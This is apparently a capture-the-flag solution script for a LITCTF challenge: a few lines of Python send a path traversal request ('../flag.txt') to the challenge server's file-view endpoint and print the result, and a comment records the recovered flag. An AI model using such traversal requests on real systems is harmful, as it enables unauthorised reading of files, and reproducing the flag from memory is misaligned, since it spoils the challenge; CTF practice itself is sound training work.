import requests

url = "http://litctf.org:31774/view-file?file=../flag.txt"
r = requests.get(url)
print(r.text)

# Flag: LITCTF{o0ps_f0rg0t_t0_s3cur3_my_dir3ct0ry}